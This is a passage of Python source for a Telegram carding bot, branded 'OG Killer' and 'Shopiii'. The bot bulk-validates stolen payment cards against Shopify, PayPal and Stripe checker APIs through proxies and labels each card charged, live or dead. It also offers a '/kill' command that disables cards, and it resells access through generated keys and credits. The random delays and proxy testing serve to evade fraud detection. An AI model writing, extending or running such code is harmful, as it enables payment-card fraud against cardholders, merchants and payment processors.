        'price': '-'
    }


# =========================
# MASS CHECK DISPATCHER
# =========================

async def mass_check(cards):

    queue = asyncio.Queue()

    for card in cards:
        queue.put_nowait(card)

    results = {
        "charged": [],
        "approved": [],
        "dead": []
    }

    checked = 0

    lock = asyncio.Lock()

    async def worker():

        nonlocal checked

        while not queue.empty():

            try:

                card = queue.get_nowait()

            except asyncio.QueueEmpty:
                break

            result = await check_card_with_retry(
                card
            )

            async with lock:

                checked += 1

                if result["status"] == "Charged":

                    results["charged"].append(
                        result
                    )

                elif result["status"] == "Approved":

                    results["approved"].append(
                        result
                    )

                else:

                    results["dead"].append(
                        result
                    )

                # THROTTLED UI
                if checked % EDIT_EVERY == 0:

                    print(
                        f"[{checked}/{len(cards)}] "
                        f"CHARGED={len(results['charged'])} "
                        f"APPROVED={len(results['approved'])} "
                        f"DEAD={len(results['dead'])}"
                    )

            queue.task_done()

    workers = [
        asyncio.create_task(worker())
        for _ in range(WORKERS)
    ]

    await asyncio.gather(*workers)

    return results


async def send_realtime_hit(user_id, result, hit_type, username):
    """Send real-time notification with new design"""
    emoji = "✅" if hit_type == "Charged" else "🔥"
    status_text = "𝐂𝐡𝐚𝐫𝐠𝐞𝐝" if hit_type == "Charged" else "𝐋𝐢𝐯𝐞"

    brand, bin_type, level, bank, country, flag = await get_bin_info(result['card'].split('|')[0])
    current_date = datetime.now().strftime("%d/%m/%Y %H:%M:%S")

    message = f"""<b>⚡💳 ㅤ#𝒮𝒽𝑜𝓅𝒾𝒾𝒾  💳⚡</b>
<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡💠 𝐇𝐢𝐭 𝐅𝐨𝐮𝐧𝐝!</b>
<blockquote>{emoji} Status: {status_text}</blockquote>
<blockquote>💳 Card: <code>{result['card']}</code></blockquote>
<blockquote>📝 Response: {result['message'][:150]}</blockquote>
<blockquote>🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {result.get('gateway', 'Unknown')} | 💰 {result.get('price', '-')}</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
<b>🎯💠 𝐁𝐈𝐍 𝐈𝐧𝐟𝐨</b>
<pre>𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}</pre>
<b>━━━━━━━━━━━━━━━━━</b>

🤖 <b>Bot By: @technopile </a></b>"""

    try:
        await bot.send_message(user_id, premium_emoji(message), parse_mode=html)
    except:
        pass



async def update_progress(user_id, message_id, results, current_attempt_count):
    """Update progress message with new design"""
    elapsed = int(time.time() - results['start_time'])
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60

    gateway = results['charged'][0]['gateway'] if results['charged'] else (results['approved'][0]['gateway'] if results['approved'] else 'Unknown')

    progress_text = f"""<b>⚡💳 ㅤ#𝒮𝒽𝑜𝓅𝒾𝒾𝒾  💳⚡</b>
<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡💠 𝐏𝐫𝐨𝐠𝐫𝐞𝐬𝐬</b>
<blockquote>💳 Total: {results['total']} | ✅ Charged: {len(results['charged'])} | 🔥 Live: {len(results['approved'])} | ❌ Dead: {len(results['dead'])}</blockquote>
<blockquote>📊 Checked: {current_attempt_count}/{results['total']}</blockquote>
<blockquote>🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {gateway}</blockquote>
<blockquote>⏱️ Time: {hours}h {minutes}m {seconds}s</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>"""

    buttons = [
        [Button.inline("⏸️ Pause", b"pause"), Button.inline("▶️ Resume", b"resume")],
        [Button.inline("🛑 Stop", b"stop")]
    ]

    try:
        await bot.edit_message(user_id, message_id, premium_emoji(progress_text), buttons=buttons, parse_mode=html)
    except:
        pass

async def send_final_results(user_id, results):
    """Send final results with txt file and new design"""
    elapsed = int(time.time() - results['start_time'])
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60

    # Build hits text
    hits_text = ""
    if results['charged']:
        for r in results['charged'][:5]:
            hits_text += f"✅ <code>{r['card']}</code>\n"
    if results['approved']:
        for r in results['approved'][:5]:
            hits_text += f"🔥 <code>{r['card']}</code>\n"

    if not hits_text:
        hits_text = "No hits found"

    gateway = results['charged'][0]['gateway'] if results['charged'] else (results['approved'][0]['gateway'] if results['approved'] else 'Unknown')

    current_date = datetime.now().strftime("%d/%m/%Y %H:%M:%S")

    summary = f"""<b>⚡💳 ㅤ#𝒮𝒽𝑜𝓅𝒾𝒾𝒾  💳⚡</b>
<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡💠 𝐑𝐞𝐬𝐮𝐥𝐭𝐬</b>
<blockquote>💳 Total: {results['total']} | ✅ Charged: {len(results['charged'])} | 🔥 Live: {len(results['approved'])} | ❌ Dead: {len(results['dead'])}</blockquote>
<blockquote>🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {gateway}</blockquote>
<blockquote>⏱️ Time: {hours}h {minutes}m {seconds}s</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
<b>🎯💠 𝐇𝐢𝐭𝐬</b>
<blockquote>{hits_text}</blockquote>
<b>━━━━━━━━━━━━━━━━━</b>

🤖 <b>Bot By: @technopile </a></b>"""

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"shopiii_{user_id}_{timestamp}.txt"

    async with aiofiles.open(filename, 'w') as f:
        await f.write("=" * 70 + "\n")
        await f.write("⚡💳 CC CHECKER RESULTS 💳⚡\n")
        await f.write("Format: CC | Gateway | Price | Message | Site\n")
        await f.write("=" * 70 + "\n\n")

        await f.write(f"✅ CHARGED ({len(results['charged'])}):\n")
        await f.write("-" * 70 + "\n")
        for r in results['charged']:
            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]} | {r.get('site', 'Unknown')}\n")
        await f.write("\n")

        await f.write(f"🔥 APPROVED ({len(results['approved'])}):\n")
        await f.write("-" * 70 + "\n")
        for r in results['approved']:
            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]} | {r.get('site', 'Unknown')}\n")
        await f.write("\n")

        await f.write(f"❌ DEAD ({len(results['dead'])}):\n")
        await f.write("-" * 70 + "\n")
        for r in results['dead']:
            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]} | {r.get('site', 'Unknown')}\n")

    await bot.send_message(user_id, premium_emoji(summary), file=filename, parse_mode=html)

    try:
        os.remove(filename)
    except:
        pass

async def test_site(site, proxy):
    """Test a single site using the direct checker API with a test card"""
    test_card = "5154623245618097|03|2032|156"
    try:
        params = {'cc': test_card, 'site': site, 'proxy': proxy}
        timeout = aiohttp.ClientTimeout(total=60)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(CHECKER_API_URL, params=params) as resp:
                raw = await resp.json(content_type=None)
                print(f"Tested site {site} with proxy {proxy}: Response: {raw}")
        response_msg = raw.get('Response', '').lower()
        if is_dead_site_error(response_msg):
            return {'site': site, 'status': 'dead'}
        return {'site': site, 'status': 'alive'}
    except:
        return {'site': site, 'status': 'dead'}

async def test_proxy(proxy):

    """Test a single proxy"""

    test_card = "5154623245618097|03|2032|156"

    test_site_url = "https://cfr-performance-retail.myshopify.com/"

    try:

        params = {
            'cc': test_card,
            'site': test_site_url,
            'proxy': proxy
        }

        timeout = aiohttp.ClientTimeout(total=60)

        async with aiohttp.ClientSession(timeout=timeout) as session:

            async with session.get(
                CHECKER_API_URL,
                params=params
            ) as resp:

                raw_text = await resp.text()

                print(f"\n[PROXY] {proxy}")
                print(f"STATUS: {resp.status}")
                print(f"RESPONSE: {raw_text[:500]}\n")

                try:

                    raw = await resp.json(content_type=None)

                except Exception as json_error:

                    print(f"JSON ERROR: {json_error}")

                    return {
                        'proxy': proxy,
                        'status': 'dead'
                    }

        response_msg = str(
            raw.get('Response', '')
        ).lower()

        dead_keywords = [
            'proxy dead',
            'invalid proxy format',
            'no proxy',
            'timeout',
            'timed out',
            'connection failed',
            'cannot connect',
            'proxy error',
            'ssl',
            '403',
            '502',
            '504'
        ]

        if any(keyword in response_msg for keyword in dead_keywords):

            return {
                'proxy': proxy,
                'status': 'dead'
            }

        return {
            'proxy': proxy,
            'status': 'alive'
        }

    except Exception as e:

        print(f"[ERROR] {proxy} -> {e}")

        return {
            'proxy': proxy,
            'status': 'dead'
        }

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    await event.reply(
        premium_emoji(
            "<b>⚡💳 Welcome to OG Killer ! 💳⚡</b>\n"
            "<b>━━━━━━━━━━━━━━━━━</b>\n"
            "<b>⚡💠 𝐂𝐂 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬</b>\n"
            "<blockquote>• /paypal card|mm|yy|cvv - Check single CC\n"
            "• /mpaypal - Reply to .txt file to check cards</blockquote>\n"

            "<b>⚡💠 Killer </b>\n"
            "<blockquote>• /kill card|mm|yy|cvv \n"
            "Kills cards in 15 seconds </blockquote>\n"
            
        ),
        parse_mode=html
    )


import json
import random
import os


KEYS_FILE = "keys.json"


def load_keys():

    if not os.path.exists(KEYS_FILE):
        with open(KEYS_FILE, "w") as f:
            json.dump([], f)

    with open(KEYS_FILE, "r") as f:

        try:
            return json.load(f)

        except:
            return []


def save_keys(data):

    with open(KEYS_FILE, "w") as f:
        json.dump(data, f, indent=4)


def KILLER_KEYS_ADD(key: str, credits: int):

    data = load_keys()

    new_key = {
        "key": key,
        "credits": credits,
        "is_used": False
    }

    data.append(new_key)

    save_keys(data)

    return {
        "status": "success",
        "key": key,
        "credits": credits,
        "message": "Key added successfully"
    }


def KILLER_KEYS_USE(key: str):

    data = load_keys()

    for item in data:

        if item["key"] == key and not item["is_used"]:

            item["is_used"] = True

            save_keys(data)

            return item["credits"]

    return None


def KILLER_KEYS_MAKE(credits: int):

    key = ''.join(
        random.choices(
            'ABCDEFGHJKLMNPQRSTUVWXYZ23456789',
            k=10
        )
    )

    KILLER_KEYS_ADD(key, credits)

    return key




@bot.on(events.NewMessage(pattern=r'/key'))
async def create_key(event):

    user_id = event.sender_id

    if user_id != OWNER_ID:

        await event.reply(
            premium_emoji(
                "❌ <b>Access Denied</b>\n\n"
                "Only owner can allow users to use killer"
            ),
            parse_mode=html
        )

        return

    parts = event.message.text.split()

    if len(parts) != 2:

        await event.reply(
            premium_emoji(
                "❌ <b>USAGE:</b>\n\n"
                "/key (credits)"
            ),
            parse_mode=html
        )

        return

    try:
        credits = int(parts[1])

    except:

        await event.reply(
            premium_emoji(
                "❌ Invalid credits amount"
            ),
            parse_mode=html
        )

        return

    key = KILLER_KEYS_MAKE(credits)

    await event.reply(

        premium_emoji(

            f"<b>⚡💳 ㅤ#KEYS 💳⚡</b>\n"
            f"<b>━━━━━━━━━━━━━━━━━</b>\n"
            f"<b>⚡💠 Generated</b>\n"
            f"<blockquote>💳 KEY: <code>{key}</code></blockquote>\n"
            f"<blockquote>💠 Credits: {credits}</blockquote>\n"
            f"<b>━━━━━━━━━━━━━━━━━</b>"

        ),

        parse_mode=html
    )


def add_credits(user_id, credits):

    users = load_users()

    if str(user_id) not in users:
        users[str(user_id)] = {"credits": 0}

    users[str(user_id)]["credits"] += credits

    save_users(users)


@bot.on(events.NewMessage(pattern=r'/redeem'))
async def redeem_key(event):

    user_id = event.sender_id

    parts = event.message.text.split()

    if len(parts) != 2:

        await event.reply(
            premium_emoji(
                "❌ <b>USAGE:</b>\n\n"
                "/redeem YOUR_KEY"
            ),
            parse_mode=html
        )

        return

    key = parts[1].strip().upper()

    data = load_keys()

    for item in data:

        if item["key"] == key:

            if item["is_used"]:

                await event.reply(
                    premium_emoji(
                        "❌ <b>Key Already Redeemed</b>"
                    ),
                    parse_mode=html
                )

                return

            item["is_used"] = True

            save_keys(data)

            credits = item["credits"]

            # ADD USER CREDITS HERE
            # Example:
            # USERS[user_id]["credits"] += credits

            add_credits(user_id, credits)

            await event.reply(

                premium_emoji(

                    f"<b>⚡💳 #REDEEMED 💳⚡</b>\n"
                    f"<b>━━━━━━━━━━━━━━━━━</b>\n"
                    f"<blockquote>✅ Key Redeemed Successfully</blockquote>\n"
                    f"<blockquote>💠 Credits Added: {credits}</blockquote>\n"
                    f"<blockquote>👤 User ID: <code>{user_id}</code></blockquote>\n"
                    f"<b>━━━━━━━━━━━━━━━━━</b>"

                ),

                parse_mode=html
            )

            return

    await event.reply(

        premium_emoji(
            "❌ <b>Invalid Key</b>"
        ),

        parse_mode=html
    )

import json
import os

USERS_FILE = "users.json"


def load_users():

    if not os.path.exists(USERS_FILE):

        with open(USERS_FILE, "w") as f:
            json.dump({}, f)

    with open(USERS_FILE, "r") as f:

        try:
            return json.load(f)

        except:
            return {}


def save_users(users):

    with open(USERS_FILE, "w") as f:
        json.dump(users, f, indent=4)


def deduct_credit(user_id):

    users = load_users()

    if str(user_id) not in users:
        return False, 0

    credits = users[str(user_id)]["credits"]

    if credits <= 0:
        return False, 0

    users[str(user_id)]["credits"] -= 1

    save_users(users)

    return True, users[str(user_id)]["credits"]


import json
import os


USERS_FILE = "killer_allowed_users.json"


def load_users():

    if not os.path.exists(USERS_FILE):

        with open(USERS_FILE, "w") as f:
            json.dump({}, f)

    with open(USERS_FILE, "r") as f:

        try:
            return json.load(f)

        except:
            return {}


def save_users(data):

    with open(USERS_FILE, "w") as f:
        json.dump(data, f, indent=4)


def KILLER_ALLOWED_USERS(user_id: int):

    data = load_users()

    return str(user_id) in data


def GET_USER_CREDITS(user_id: int):

    data = load_users()

    return data.get(str(user_id), {}).get("credits", 0)


def ADD_USER(user_id: int, credits: int):

    data = load_users()

    data[str(user_id)] = {
        "credits": credits
    }

    save_users(data)


def REMOVE_CREDIT(user_id: int):

    data = load_users()

    uid = str(user_id)

    if uid not in data:
        return False

    if data[uid]["credits"] <= 0:
        return False

    data[uid]["credits"] -= 1

    save_users(data)

    return True


#kill command
@bot.on(events.NewMessage(pattern=r'/kill'))
async def kill(event):

    user_id = event.sender_id

    if not KILLER_ALLOWED_USERS(user_id):

        await event.reply(
            premium_emoji(
                "❌ <b>Access Denied</b>\n\n"
                "Only allowed users can use killer"
            ),
            parse_mode=html
        )

        return

    parts = event.message.text.split(maxsplit=1)

    print('card got :', parts)

    if len(parts) < 2:

        await event.reply(
            premium_emoji(
                "❌ <b>Invalid Command</b>\n\n"
                "Use: <code>/kill card|mm|yy|cvv</code>"
            ),
            parse_mode=html
        )

        return

    cc_input = parts[1].strip()

    cards = extract_cc(cc_input)

    

    if not cards:

        await event.reply(
            premium_emoji(
                "❌ Invalid CC format.\n\n"
                "Use: <code>/kill card|mm|yy|cvv</code>"
            ),
            parse_mode=html
        )

        return
    

    card = cards[0]
    print(card)
    
    num = card.split('|')[0]
    mm = card.split('|')[1]
    yy = card.split('|')[2]
    cvv = card.split('|')[3]

    status_msg = await event.reply(
        premium_emoji(
            f"<b>⚡💳 ㅤ#𝒮𝒽𝑜𝓅𝒾𝒾𝒾  💳⚡</b>\n"
            f"<b>━━━━━━━━━━━━━━━━━</b>\n"
            f"<b>⚡💠 Killing...</b>\n"
            f"<blockquote>💳 Card: <code>{card}</code></blockquote>\n"
            f"<b>━━━━━━━━━━━━━━━━━</b>"
        ),
        parse_mode=html
    )

    deduct_credit(user_id)
    

    try:
        # Create async session
        
        result = await kill_card(num, mm, yy, cvv)

        # Validate API response
        if not result or not isinstance(result, dict):
            await status_msg.edit(premium_emoji(f"❌ Invalid API response"), parse_mode=html)
            return

        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])

        # Use .get() with defaults to safely access dictionary keys
        result_message = result.get('message', 'No response from API')
        result_card = result.get('card', card)
        
        if result_message == "Card has been killed successfully.":
            status_emoji = "✅"
            status_text = "𝐊𝐢𝐥𝐥𝐞𝐝"

        else:
            status_emoji = "❌"
            status_text = "Kill Failed, try again"


        final_resp = f"""<b>⚡💳 ㅤ#𝒮𝒽𝑜𝓅𝒾𝒾𝒾  💳⚡</b>
<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡💠 𝐑𝐞𝐬𝐮𝐥𝐭𝐬</b>
<blockquote>{status_emoji} Status: {status_text}</blockquote>
<blockquote>💳 Card: <code>{result_card}</code></blockquote>
<blockquote>📝 Response: {result_message[:150]}</blockquote>

<b>━━━━━━━━━━━━━━━━━</b>
<b>🎯💠 𝐁𝐈𝐍 𝐈𝐧𝐟𝐨</b>
<pre>𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}</pre>
<b>━━━━━━━━━━━━━━━━━</b>

🤖 <b>Bot By: @technopile </a></b>"""

        await status_msg.edit(premium_emoji(final_resp), parse_mode=html)

    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error killing card: {e}"), parse_mode=html)

    

@bot.on(events.NewMessage(pattern=r'/allowkill'))
async def allow_kill(event):

    owner_id = event.sender_id

    if owner_id != OWNER_ID:

        await event.reply(
            premium_emoji(
                "❌ <b>Access Denied</b>\n\n"
                "Only owner can allow users to use killer"
            ),
            parse_mode=html
        )

        return

    parts = event.message.text.strip().split()

    if len(parts) != 3:

        await event.reply(
            premium_emoji(
                "❌ <b>Invalid Command</b>\n\n"
                "Use: /allowkill userid credits"
            ),
            parse_mode=html
        )

        return

    try:

        target_user = int(parts[1])
        credits = int(parts[2])

    except:

        await event.reply(
            premium_emoji(
                "❌ Invalid user id or credits"
            ),
            parse_mode=html
        )

        return

    if KILLER_ALLOWED_USERS(target_user):

        await event.reply(
            premium_emoji(
                "⚠️ <b>User Already Allowed</b>"
            ),
            parse_mode=html
        )

        return

    ADD_USER(target_user, credits)

    await event.reply(

        premium_emoji(

            f"✅ <b>User Allowed</b>\n\n"
            f"<blockquote>"
            f"👤 User ID: <code>{target_user}</code>\n"
            f"💠 Credits: {credits}"
            f"</blockquote>"

        ),

        parse_mode=html
    )


@bot.on(events.NewMessage(pattern=r'/disallowkill'))
async def disallow_kill(event):

    owner_id = event.sender_id

    if owner_id != OWNER_ID:

        await event.reply(
            premium_emoji(
                "❌ <b>Access Denied</b>\n\n"
                "Only owner can disallow users to use killer"
            ),
            parse_mode=html
        )

        return

    parts = event.message.text.strip().split()

    if len(parts) != 2:

        await event.reply(
            premium_emoji(
                "❌ <b>Invalid Command</b>\n\n"
                "Use: /disallowkill userid"
            ),
            parse_mode=html
        )

        return

    try:

        target_user = int(parts[1])

    except:

        await event.reply(
            premium_emoji(
                "❌ Invalid user id"
            ),
            parse_mode=html
        )

        return

    data = load_users()

    uid = str(target_user)

    if uid not in data:

        await event.reply(
            premium_emoji(
                "⚠️ <b>User Not Found</b>"
            ),
            parse_mode=html
        )

        return

    del data[uid]

    save_users(data)

    await event.reply(

        premium_emoji(

            f"✅ <b>User Disallowed</b>\n\n"
            f"<blockquote>"
            f"👤 User ID: <code>{target_user}</code>"
            f"</blockquote>"

        ),

        parse_mode=html
    )


@bot.on(events.NewMessage(pattern=r'/credits'))
async def credits_command(event):

    user_id = event.sender_id

    if not KILLER_ALLOWED_USERS(user_id):

        await event.reply(
            premium_emoji(
                "❌ <b>You Are Not Allowed To Use Killer</b>"
            ),
            parse_mode=html
        )

        return

    credits = GET_USER_CREDITS(user_id)

    await event.reply(

        premium_emoji(

            f"<b>⚡💳 #CREDITS 💳⚡</b>\n"
            f"<b>━━━━━━━━━━━━━━━━━</b>\n"
            f"<blockquote>"
            f"👤 User ID: <code>{user_id}</code>\n"
            f"💠 Credits: <b>{credits}</b>"
            f"</blockquote>\n"
            f"<b>━━━━━━━━━━━━━━━━━</b>"

        ),

        parse_mode=html
    )


@bot.on(events.NewMessage(pattern=r'/paypal'))
async def paypal(event):

    active_session = []

    user_id = event.sender_id

    active_session.append(user_id)

    if not KILLER_ALLOWED_USERS(user_id):
        # Rate limiting
        current_time = time.time()
        if user_id in user_check_times:
            time_since_last_check = current_time - user_check_times[user_id]
            if time_since_last_check < RATE_LIMIT_SECONDS:
                wait_time = int(RATE_LIMIT_SECONDS - time_since_last_check)
                await event.reply(premium_emoji(f"⏳ <b>Rate Limit</b>\n\nPlease wait {wait_time} seconds before checking another card."), parse_mode=html)
                return
        
        # Update last check time
        user_check_times[user_id] = current_time


    PAYPAL_API = 'http://0.0.0.0:8000/paypal'
    #PAYPAL_API = 'http://0.0.0.0:8000/paypal'

    __headers = {

        'Content-Type': 'application/json',
    }
 
    
    
    if not len(event.message.text.split()) == 2:
        await event.reply(premium_emoji("❌ <b>Invalid Command</b>\n\nUse: <code>/paypal card|mm|yy|cvv</code>"), parse_mode=html)
        return
    
    
    num = event.message.text.split(' ')[1].strip().split('|')[0]
    mm = event.message.text.split(' ')[1].strip().split('|')[1]
    if len(event.message.text.split(' ')[1].strip().split('|')[2]) == 4:
         yy = event.message.text.split(' ')[1].strip().split('|')[2][2:]
    else:
        yy = event.message.text.split(' ')[1].strip().split('|')[2]
    cvv = event.message.text.split(' ')[1].strip().split('|')[3]

    bin = num[:6]  # Extract BIN (first 6 digits)
    card = f"{num}|{mm}|{yy}|{cvv}"


    status_msg = await event.reply(
        premium_emoji(
            f"<b>⚡💳 ㅤ#PayPal  💳⚡</b>\n"
            f"<b>━━━━━━━━━━━━━━━━━</b>\n"
            f"<b>⚡💠 Checking...</b>\n"
            f"<blockquote>💳 Card: <code>{card}</code></blockquote>\n"
            f"<b>━━━━━━━━━━━━━━━━━</b>"
        ),
        parse_mode=html
    )

    try:
        async with session.get(PAYPAL_API, json={'num': num,
                                                  'mon': mm,
                                                  'yer': yy,
                                                  'cvc': cvv}, timeout=40) as response:
            result = await response.json()
        
        print('response: ', result)

        brand, bin_type, level, bank, country, flag = await get_bin_info(bin)

        if 'ISSUER_DECLINE' in result['message'] or 'GENERIC_ERROR' in result['message'] or 'GENERIC ERROR' in result['message'] or 'DECLINED' in result['message']:
            status_emoji = "❌"
            status_text = "CARD_DECLINED"
            message = result['message']
            
        elif 'APPROVED' in result['message'] or 'ACCEPTED' in result['message']:
            status_emoji = "🔥"
            status_text = "APPROVED"
            message = result['message']

        elif 'CHARGED' in result['message']:
            status_emoji = "✅"
            status_text = "CHARGED"
            message = result['message']

        else:
            status_emoji = "❌"
            status_text = "See API respone"
            message = result['message']


        final_resp = f"""<b>⚡💳 ㅤ#PayPal  💳⚡</b>
<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡💠 𝐑𝐞𝐬𝐮𝐥𝐭𝐬</b>
<blockquote>{status_emoji} Status: {status_text}</blockquote>
<blockquote>💳 Card: <code>{card}</code></blockquote>
<blockquote>📝 Response: {result['message'][:150]}</blockquote>
<blockquote>🤖 Message: {message[:30]} </blockquote>
<b>━━━━━━━━━━━━━━━━━</b>
<b>🎯💠 𝐁𝐈𝐍 𝐈𝐧𝐟𝐨</b>
<pre>𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}</pre>
<b>━━━━━━━━━━━━━━━━━</b>

🤖 <b>Bot By: @technopile </a></b>"""

        await status_msg.edit(premium_emoji(final_resp), parse_mode=html)

    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error checking card: {e}"), parse_mode=html)


# ========= MASS CHECK HANDLER FOR ALL GATES =========
async def mass_check_handler(event, gate):
    """Generic mass check handler - PayPal, Stripe, etc."""
    user_id = event.sender_id
    
    if not KILLER_ALLOWED_USERS(user_id):
        await event.reply(premium_emoji("❌ Needs access from Admin"), parse_mode=html)
        return
    
    if not event.is_reply:
        await event.reply(premium_emoji(f"❌ <b>Invalid Usage</b>\n\nReply to a .txt file with cards (one per line)\n<code>card|mm|yy|cvv</code>"), parse_mode=html)
        return
    
    replied_msg = await event.get_reply_message()
    if not replied_msg.document:
        await event.reply(premium_emoji("❌ <b>No File Found</b>"), parse_mode=html)
        return
    
    try:
        file_path = await bot.download_media(replied_msg, file=f"/tmp/cards_{user_id}_{gate}.txt")
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Download error: {e}"), parse_mode=html)
        return
    
    try:
        with open(file_path, 'r') as f:
            lines = [l.strip() for l in f.readlines() if l.strip() and '|' in l]
        
        cards = [{'num': p[0], 'mon': p[1], 'yer': p[2], 'cvc': p[3]} 
                for line in lines if (p := line.split('|')) and len(p) >= 4]
        
        if not cards:
            await event.reply(premium_emoji("❌ No valid cards found"), parse_mode=html)
            return
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Error: {e}"), parse_mode=html)
        return
    
    session_id = f"{user_id}_{gate}_{int(time.time())}"
    result_files = {k: f"/tmp/{session_id}_{k}.txt" for k in ['charged', 'approved', 'declined', 'errors']}
    for f in result_files.values():
        open(f, 'w').close()
    
    # Create stop event for this mass check session
    mass_check_events[session_id] = asyncio.Event()
    
    buttons = [
        [Button.inline("🔥 Charged: 0", data=f"charged_{session_id}".encode()),
         Button.inline("✅ Approved: 0", data=f"approved_{session_id}".encode()),
         Button.inline("❌ Declined: 0", data=f"declined_{session_id}".encode())],
        [Button.inline("💥 Errors: 0", data=f"errors_{session_id}".encode()),
         Button.inline("🛑 Stop", data=f"stop_{session_id}".encode())]
    ]
    
    status_msg = await event.reply(
        premium_emoji(f"<b>⚡💳 #{gate.upper()} MASS CHECK 💳⚡</b>\n<b>📊 Total: {len(cards)} | Checked: 0</b>\n<b>⚡💠 Checking...</b>"),
        buttons=buttons,
        parse_mode=html
    )
    
    API_URLS = {'paypal': 'http://0.0.0.0:8000/paypal', 'stripe': 'https://stripe360-production.up.railway.app/stripe_1'}
    api_url = API_URLS.get(gate, API_URLS['paypal'])
    counts = {'charged': 0, 'approved': 0, 'declined': 0, 'errors': 0}
    
    for idx, card in enumerate(cards):
        # Check if stop was requested
        if mass_check_events[session_id].is_set():
            break
            
        try:
            await asyncio.sleep(random.randint(6, 10))
            card_str = f"{card['num']}|{card['mon']}|{card['yer']}|{card['cvc']}"
            async with session.post(api_url, json=card, timeout=40) as response:
                result = await response.json()
            msg = result.get('message', 'UNKNOWN')
            
            if 'CHARGED' in msg:
                counts['charged'] += 1
                res_type = 'charged'
            elif 'APPROVED' in msg or 'ACCEPTED' in msg:
                counts['approved'] += 1
                res_type = 'approved'
            else:
                counts['declined'] += 1
                res_type = 'declined'
            
            with open(result_files[res_type], 'a') as f:
                f.write(card_str + '\n')
            
            if (idx + 1) % 3 == 0:
                buttons = [[Button.inline(f"🔥 Charged: {counts['charged']}", data=f"charged_{session_id}".encode()),
                           Button.inline(f"✅ Approved: {counts['approved']}", data=f"approved_{session_id}".encode()),
                           Button.inline(f"❌ Declined: {counts['declined']}", data=f"declined_{session_id}".encode())],
                          [Button.inline(f"💥 Errors: {counts['errors']}", data=f"errors_{session_id}".encode()),
                           Button.inline("🛑 Stop", data=f"stop_{session_id}".encode())]]
                await status_msg.edit(premium_emoji(f"<b>⚡💳 #{gate.upper()} 💳⚡</b>\n<b>📊 {idx+1}/{len(cards)}</b>"), buttons=buttons, parse_mode=html)
        except Exception as e:
            counts['errors'] += 1
            with open(result_files['errors'], 'a') as f:
                f.write(f"{card_str} - {str(e)}\n")
    
    buttons = [[Button.inline(f"🔥 Charged: {counts['charged']}", data=f"charged_{session_id}".encode()),
               Button.inline(f"✅ Approved: {counts['approved']}", data=f"approved_{session_id}".encode()),
               Button.inline(f"❌ Declined: {counts['declined']}", data=f"declined_{session_id}".encode())],
              [Button.inline(f"💥 Errors: {counts['errors']}", data=f"errors_{session_id}".encode())]]
    
    # Remove session from tracking when complete
    if session_id in mass_check_events:
        del mass_check_events[session_id]
    
    await status_msg.edit(premium_emoji(f"<b>⚡💳 #{gate.upper()} COMPLETE 💳⚡</b>\n<b>✅ {counts['charged']} | 🔥 {counts['approved']} | ❌ {counts['declined']} | 💥 {counts['errors']}</b>\n<b>Click buttons</b>"), buttons=buttons, parse_mode=html)
    
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('INSERT INTO check_sessions (session_id, user_id, gate, total_cards, checked, charged_count, approved_count, declined_count, error_count, message_id) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)',
              (session_id, user_id, gate, len(cards), len(cards), counts['charged'], counts['approved'], counts['declined'], counts['errors'], status_msg.id))
    conn.commit()
    conn.close()


@bot.on(events.NewMessage(pattern=r'/mpaypal'))
async def mpaypal(event):
    await mass_check_handler(event, 'paypal')

import aiohttp
import random

STRIPE_APIS = [
    "https://stripe360-production.up.railway.app/stripe_1",
    "https://stripe360-production.up.railway.app/stripe_2",
    "https://stripe360-production.up.railway.app/stripe_3",
    "https://stripe360-production.up.railway.app/stripe_4",
    "https://stripe360-production.up.railway.app/stripe_5",
    "https://stripe360-production.up.railway.app/stripe_6",
    "https://stripe360-production.up.railway.app/stripe_7",
    "https://stripe360-production.up.railway.app/stripe_8",
    "https://stripe360-production.up.railway.app/stripe_9",
]


@bot.on(events.NewMessage(pattern=r'^/st(?:@[\w_]+)?(?:\s|$)'))
async def stripe_single(event):

    user_id = event.sender_id

    if not KILLER_ALLOWED_USERS(user_id):
        await event.reply(
            premium_emoji("❌ Needs access from Admin"),
            parse_mode=html
        )
        return

    args = event.message.text.split(maxsplit=1)

    if len(args) != 2:
        await event.reply(
            premium_emoji(
                "❌ <b>Invalid Command</b>\n\n"
                "Use: <code>/st card|mm|yy|cvv</code>"
            ),
            parse_mode=html
        )
        return

    card_display = args[1].strip()

    split_card = card_display.split('|')

